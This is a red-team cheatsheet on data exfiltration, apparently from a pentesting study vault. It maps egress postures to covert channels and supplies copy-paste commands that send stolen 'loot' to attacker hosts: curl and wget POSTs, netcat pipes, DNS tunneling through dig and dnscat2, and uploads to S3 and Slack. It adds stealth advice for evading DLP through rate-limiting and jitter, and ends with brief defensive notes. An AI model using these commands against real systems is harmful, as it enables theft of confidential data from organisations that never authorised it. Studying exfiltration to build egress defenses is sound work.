---
tags: [tools, exfiltration, post-exploitation, pentesting, red-team]
difficulty: advanced
module: "46 - Operator Technique Cheatsheets"
topic: "46.04 Data Exfiltration Techniques"
---

# Data Exfiltration Techniques

## Introduction
**Exfiltration** is getting data out of a compromised environment to attacker-controlled infrastructure. In a pentest/red-team it both demonstrates impact (proving you could steal the crown jewels) and tests the defender's ability to **detect and block egress**. The right technique depends entirely on what egress is allowed: a wide-open network takes a simple HTTPS upload; a locked-down environment forces covert channels like DNS or ICMP. This note maps the channels from loudest/simplest to stealthiest, with copy-paste commands.

## Channel Selection
```text
+---------------------------------------------------------------+
|  Egress posture            ->  Exfil channel                  |
+---------------------------------------------------------------+
|  Open outbound             ->  HTTPS / SCP / cloud upload     |
|  Web proxy only            ->  HTTP(S) to a proxied domain     |
|  DNS resolves externally   ->  DNS tunneling (very common gap)|
|  ICMP allowed              ->  ICMP tunneling                 |
|  Cloud-allowed domains     ->  exfil to S3/Drive/Slack/Gist   |
|  Air-gapped/strict         ->  staged + physical, or timing   |
+---------------------------------------------------------------+
```

## HTTP(S) / Web
```bash
# POST a file to your server
curl -s -X POST --data-binary @loot.tar.gz https://ATTACKER/u
# wget
wget --post-file=loot.tar.gz https://ATTACKER/u
# simple listener (attacker)
python3 -m http.server   # for pulling tools IN; use a POST handler for exfil
# nc raw
tar czf - /data | nc ATTACKER 443
```
Blend with normal traffic: use **443**, a valid TLS cert, and a benign-looking domain/path.

## DNS Tunneling (the classic egress gap)
DNS almost always resolves outward even when everything else is blocked. Encode data into subdomain labels of a domain whose NS you control:
```bash
# concept: each query leaks a chunk
xxd -p loot | while read c; do dig $c.exfil.attacker.com; done
# tools: iodine, dnscat2, dns2tcp automate chunking + a shell over DNS
dnscat2-server attacker.com           # attacker
./dnscat2 attacker.com                 # victim -> C2/exfil over DNS
```
Slow but extremely evasive; ideal when only DNS leaves the network.

## ICMP Tunneling
Where ping egress is permitted, smuggle data in ICMP echo payloads:
```bash
# tools: icmpsh, ptunnel, hans
# concept: data rides in the ICMP data field
```

## Cloud / SaaS Channels (living off allowed domains)
Networks that block "random" domains often allow major SaaS — abuse that trust:
```bash
aws s3 cp loot.tar.gz s3://attacker-bucket/      # if aws-cli + egress to AWS
curl -F file=@loot -F token=$T https://slack.com/api/files.upload
# GitHub gist, Google Drive API, Telegram bot, Discord webhook, pastebin
```
Traffic to `*.amazonaws.com` / `slack.com` looks legitimate and is rarely blocked.

## Encoding, Chunking, Staging
```bash
# compress + encrypt before exfil (confidentiality + smaller + evades content DLP)
tar czf - /data | openssl enc -aes-256-cbc -pbkdf2 -k PASS | base64 -w0 > out.b64
# split into chunks to fit channel limits / look like noise
split -b 512 out.b64 chunk_
```
Always **encrypt** sensitive client data in transit; **compress** to reduce volume and timing signatures; **chunk** to fit DNS label / packet limits.

## Stealth Considerations
- **Rate-limit** to avoid volume-based DLP/NetFlow alerts (slow-drip over hours).
- **Jitter** request timing; avoid round-number intervals.
- **Beacon-like** small transfers blend better than one large upload.
- Prefer channels that match the host's normal behaviour (a web server exfiltrating over HTTPS is less odd than over DNS).

## Why It Matters
Exfiltration is where "impact" is proven and where many defenses are weakest — DNS and cloud-domain egress are frequently uncontrolled. Demonstrating a working covert channel (and getting it caught, or not) is a core deliverable, and the channel choice directly tests the organisation's DLP/egress maturity.

## Defensive Notes
- **Egress filtering**: default-deny outbound; force web traffic through an inspecting proxy; restrict which hosts may make DNS queries (internal resolvers only) and inspect DNS volume/entropy.
- **DLP** on content + volume; alert on long, high-entropy DNS subdomains, sustained ICMP payloads, and large/odd uploads to cloud SaaS.
- Baseline normal egress per host; flag servers initiating outbound to new domains.

## Related Notes
- [[03 - Tunneling and Port Forwarding]]
- [[01 - Reverse and Bind Shell Cheatsheet]]
- [[08 - Exposing Local Services to the Internet]]
- [[15 - macOS Sensitive Locations and Credential Theft]]
